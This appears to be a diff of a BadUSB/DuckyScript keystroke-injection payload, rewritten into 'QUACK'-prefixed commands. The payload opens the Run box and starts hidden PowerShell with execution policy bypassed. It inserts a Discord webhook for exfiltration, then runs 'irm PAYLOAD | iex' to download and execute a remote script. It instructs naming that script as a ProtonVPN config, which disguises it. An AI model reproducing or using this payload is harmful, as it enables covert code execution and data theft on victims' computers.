@@ -28,14 +28,14 @@
 * 
 
 
-DELAY 2000
-GUI r
-DELAY 250
-DELETE
-STRING powershell -w h -ep bypass $discord='
+QUACK DELAY 2000
+QUACK GUI r
+QUACK DELAY 250
+QUACK DELETE
+QUACK STRING powershell -w h -ep bypass $discord='
 * REQUIRED - Provide your url WEBHOOK - https://discordapp.com/api/webhooks/<webhook_id>/<token>
-STRING WEBHOOK
+QUACK STRING WEBHOOK
 
 * Reply example.com with YOUR LINK. The Payload should be ProtonVPN-config.ps1
-STRING ';irm PAYLOAD | iex
-ENTER
+QUACK STRING ';irm PAYLOAD | iex
+QUACK ENTER
